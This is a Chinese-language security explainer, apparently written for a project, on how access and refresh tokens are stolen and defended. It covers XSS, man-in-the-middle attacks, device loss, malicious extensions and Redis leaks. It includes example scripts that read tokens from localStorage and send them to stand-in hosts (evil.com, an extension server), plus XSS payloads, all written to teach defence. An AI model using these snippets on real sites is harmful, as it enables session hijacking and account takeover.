# 令牌被盗的攻击方式详解

> **你的问题**：AT、RT 为什么会被盗用？攻击者是怎么做到的？我对网络安全这块存在很大的问题。

---

## 一、令牌存在哪里，攻击者就往哪里打

要理解令牌怎么被盗，首先要知道令牌存在哪。

本项目的令牌（AT、RT）以 JSON 响应体的方式下发给前端，前端通常把它存在：
- **`localStorage`**（最常见）：浏览器的持久化键值存储，关闭标签页不消失
- **`sessionStorage`**：关闭标签页后消失
- **内存变量**（最安全，但刷新页面就没了）

攻击者的目标就是：**拿到 AT 或 RT 的字符串**，然后自己发请求冒充受害者。

---

## 二、攻击方式一：XSS（跨站脚本攻击）—— 最主要的威胁

### 什么是 XSS

XSS（Cross-Site Scripting）是指攻击者设法在你访问的**合法网站**上运行恶意 JavaScript 代码。

### 攻击流程（以内容平台为例）

```
场景：知光平台允许用户在帖子里写内容

攻击者发布一篇帖子，内容包含恶意脚本：
  "这是一篇普通帖子<script>
    // 读取 localStorage 里的所有令牌
    const tokens = {
      at: localStorage.getItem('access_token'),
      rt: localStorage.getItem('refresh_token')
    };
    // 发送到攻击者的服务器
    fetch('https://evil.com/steal?data=' + btoa(JSON.stringify(tokens)));
  </script>"

受害者访问这篇帖子，浏览器渲染页面时执行了这段脚本（因为它在 zhiguang.cn 的页面上）：
  → 同源策略不会阻止，因为这段脚本的"来源"被视为 zhiguang.cn 本身
  → localStorage.getItem() 成功读取令牌
  → tokens 被发送到 evil.com

攻击者收到令牌，可以在 15 分钟内用 AT 随意操作
```

### XSS 的三种类型

**存储型 XSS（最危险）**：恶意脚本存储在服务器数据库里（如上面的帖子），每个访问者都会被攻击。

**反射型 XSS**：恶意脚本包含在 URL 里，需要诱导用户点击特定链接。
```
攻击者发给受害者一个链接：
https://zhiguang.cn/search?q=<script>steal()</script>
如果后端把 q 参数直接渲染到 HTML，脚本就被执行了
```

**DOM 型 XSS**：前端 JavaScript 不安全地把用户输入写入页面。
```javascript
// 危险代码（前端写的）
document.getElementById('title').innerHTML = userInput;
// 如果 userInput 是 "<script>steal()</script>"，就执行了
```

### 防御手段

- **后端对用户输入做 HTML 转义**：把 `<script>` 变成 `&lt;script&gt;`，让浏览器显示文本而不是执行脚本（**根本防御**）
- **前端用 `textContent` 而不是 `innerHTML`**：`textContent` 不会解析 HTML 标签
- **Content-Security-Policy（CSP）响应头**：告诉浏览器只允许执行来自特定域名的脚本，封堵内联脚本执行
- **把令牌存内存而不是 localStorage**：XSS 无法读取 JavaScript 作用域外的变量（但刷新页面需要重新登录）

## 三、攻击方式二：中间人攻击（MITM）—— 网络传输层的威胁

### 什么是中间人攻击

中间人（Man-In-The-Middle，MITM）攻击是指攻击者悄悄插入到你和服务器之间的通信链路里，偷看甚至修改你们的通信内容。

### 攻击流程

**场景：你连接了公共 WiFi（咖啡店、机场）**

```
正常情况的通信路径：
你的手机 → 路由器 → 互联网 → 服务器

被攻击的通信路径：
你的手机 → 伪造热点（攻击者控制）→ 互联网 → 服务器
              ↑
         攻击者在这里抓包，能看到所有明文数据
```

如果网站使用 **HTTP（明文）**，攻击者可以直接看到请求头里的 `Authorization: Bearer eyJ...`，令牌直接泄露。

### HTTPS 如何防御

**HTTPS（HTTP + TLS）** 对传输内容进行加密，即使攻击者截获了数据包，也只是乱码：

```
你发出的请求（加密后）：
0x4f 3a 8b 2c 9f ... （随机乱码）

攻击者截获：
????? （无法解密，因为没有私钥）
```

**为什么 HTTPS 能防止中间人？** TLS 握手阶段会验证服务器的**数字证书**（由受信任的 CA 颁发），确认你连接的确实是真正的 `zhiguang.cn` 而不是攻击者伪造的服务器。

**还需要注意**：
- 不要在 HTTP 网站上使用账号（令牌会明文传输）
- 不要随便信任"安全证书警告"——浏览器弹出证书警告是在告诉你可能正在遭受中间人攻击

## 四、攻击方式三：设备丢失 / 直接盗取存储

### 攻击方式

这是最直接的：攻击者物理接触到了存储令牌的设备。

- 手机丢失，解锁后直接访问应用
- 共享电脑，前一个用户忘记退出，`localStorage` 里还有令牌
- 恶意 App 读取同一设备上其他 App 的存储（不同 App 的 `localStorage` 通常是隔离的，但浏览器扩展可能可以）

### 应对措施

- 主动登出会清除 RT（本项目的 `/logout` 接口调用 `revokeToken`）
- 改密码会撤销所有 RT（`revokeAll`），所有已有会话强制失效
- 设备锁屏、远程擦除

---

## 五、攻击方式四：恶意浏览器扩展

### 攻击方式

浏览器扩展（插件）通常有权限读取页面的 DOM、访问 `localStorage`、甚至注入脚本。一个看起来无害的扩展（如"截图工具"、"购物助手"）可能在后台偷偷读取所有网站的 `localStorage`。

```
恶意扩展的代码（content_script）：
// 在每个网页加载时运行
const at = localStorage.getItem('access_token');
const rt = localStorage.getItem('refresh_token');
if (at) {
    fetch('https://evil-extension-server.com/steal', {
        method: 'POST',
        body: JSON.stringify({ url: location.href, at, rt })
    });
}
```

### 防御：把令牌存内存，而不是 localStorage

最根本的防御是：**AT 和 RT 只存在 JavaScript 变量里（内存中），不写 `localStorage`**。

```javascript
// 安全的前端令牌管理（示意）
let accessToken = null;
let refreshToken = null;

async function login(credentials) {
    const res = await fetch('/api/v1/auth/login', { ... });
    const data = await res.json();
    accessToken = data.token.accessToken;    // 只存内存，不写 localStorage
    refreshToken = data.token.refreshToken;
}
```

代价：刷新页面（F5）后变量消失，用户需要重新登录。

折中方案：AT 存内存（每 15 分钟刷新），RT 存 HttpOnly Cookie（JS 无法读取）。

## 六、攻击方式五：服务端漏洞（数据库泄露）

### 攻击方式

如果攻击者入侵了服务器，拿到了 Redis 的访问权，可以直接读取白名单里的所有 RT：

```
攻击者在 Redis 里执行：
KEYS auth:rt:*
→ 返回所有用户的 Refresh Token jti 列表

但等等——jti 只是 UUID，攻击者还需要 RT 的完整 JWT 字符串才能使用，
而 RT 字符串并不存在 Redis 里（Redis 只存了 jti 作为白名单键）。
```

这里的架构设计有一个隐性安全好处：**Redis 里存的是 RT 的 jti（UUID），不是 RT 字符串本身**。即使 Redis 被攻击，攻击者也只能知道"哪些令牌是有效的"，但他没有这些令牌的完整字符串，无法冒充用户。

真正的 RT 字符串只在两个地方存在：
1. 签发时的服务器内存（转瞬即逝）
2. 前端存储（用户设备）

所以攻击 Redis 并不能直接拿到可用的令牌，但攻击者可以通过删除白名单键来让所有用户的 RT 失效（拒绝服务攻击）。

## 七、各攻击方式汇总对照

| 攻击方式 | 攻击者能拿到什么 | 前提条件 | 防御措施 |
|---|---|---|---|
| **XSS** | AT + RT 字符串 | 网站存在 XSS 漏洞 | 转义输出、CSP、令牌存内存 |
| **中间人攻击** | 传输中的 AT 字符串 | 使用 HTTP 或不受信任网络 | 全站 HTTPS、HSTS |
| **设备丢失** | localStorage 里的 AT + RT | 物理接触设备 | 主动登出、改密码、远程擦除 |
| **恶意扩展** | localStorage 里的 AT + RT | 用户安装了恶意扩展 | 令牌存内存而非 localStorage |
| **数据库/Redis 泄露** | RT 的白名单状态（非字符串） | 服务器被入侵 | Redis 访问控制、令牌字符串不入库 |
| **钓鱼攻击** | 用户名 + 密码（间接） | 用户被欺骗在假网站登录 | 用户安全意识、浏览器防钓鱼 |

## 八、本项目的防御体系回顾

```
攻击面                  本项目的防御措施
─────────────────────────────────────────────────────────────────────
XSS 盗取令牌           → 后端对用户内容转义（假设有做）
                        → AT 有效期只有 15 分钟，即使被盗损失有限
                        → RT 令牌轮换，被盗后一次性使用即失效
                        → RT 白名单可主动撤销

传输层嗅探              → HTTPS 加密（假设生产环境已配置）

RT 被盗后续期           → 令牌轮换（每个 RT 只能用一次）
                        → Redis 白名单（可主动 revokeAll 踢出）

密码暴力破解            → BCrypt（强度 12，每次 hash 耗时约 250ms，暴力破解成本极高）

验证码暴力穷举          → 最多 5 次尝试，超限锁定 30 分钟
                        → 每日发送次数上限（10 次）

接口滥用                → 令牌桶限流（关系系统等处有实现）
```

---

## 九、一句话总结

> AT/RT 被盗最常见的途径是 **XSS（网站存在脚本注入漏洞）** 和 **中间人攻击（使用了不安全的 HTTP 连接）**，前者让攻击者在受害者浏览器里执行任意 JS 读走 localStorage，后者让攻击者在网络传输中截获明文令牌。全站 HTTPS 防传输层，XSS 防护防读取层，令牌轮换 + 白名单撤销是事后的补救机制。
